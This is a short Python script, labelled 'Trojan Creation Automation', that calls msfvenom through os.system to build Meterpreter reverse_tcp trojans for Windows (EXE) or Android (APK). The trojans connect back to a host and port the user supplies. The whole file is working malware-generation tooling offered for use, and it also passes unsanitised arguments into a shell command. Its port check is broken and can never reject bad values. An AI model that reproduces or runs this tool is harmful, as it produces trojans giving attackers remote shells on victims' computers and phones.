import argparse, os, sys

class Exploits:

    def __init__(self, payload, lHost, lPort, name):
        self.payload    = payload
        self.lHost      = lHost
        self.lPort      = lPort
        self.name       = name

    def generateExploit(self):
        try:
            print('[*] Trojan Generation Started\n')
            os.system('msfvenom -p %s LHOST=%s LPORT=%s R > /root/Desktop/%s' % (self.payload, self.lHost, self.lPort, self.name))
            print('[*] Generation Completed')
        except Exception as e:
            print('[!] Generation Failed:', e)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Trojan Creation Automation')
    parser.add_argument('--arch', required=True, help='Architecture Of Trojan [EXE or APK]')
    parser.add_argument('--host', required=True, help='Host To Connect')
    parser.add_argument('--port', required=True, help='Port To Connect')
    parser.add_argument('--name', required=True, help='Name Of The Trojan')
    args = parser.parse_args()

    if args.arch.lower() == 'exe':
        payload = 'windows/x64/meterpreter/reverse_tcp'
    elif args.arch.lower() == 'apk':
        payload = 'android/meterpreter/reverse_tcp'
    else:
        print('[!] Incorrect Architecture (only EXE and APK are available)')
        sys.exit(-1)

    try:
        if len(args.host.split('.')) > 4 :
            print('[!] Incorrect Host Format, It Should Contain Valid IP')
            sys.exit(-1)
    except:
        print('[!] Incorrect Host Format, It Should Contain Valid IP')
        sys.exit(-1)
    try:
        if args.port < 0 and args.port > 65535:
            print('[!] Incorrect Port Number, It Should Be In Range 0-65535')
            sys.exit(-1)
    except:
        print('[!] Incorrect Port Number Format')
        sys.exit(-1)

    temporary = Exploits(payload=payload, lHost=args.host, lPort=args.port, name=args.name+'.'+args.arch.lower())
    temporary.generateExploit()
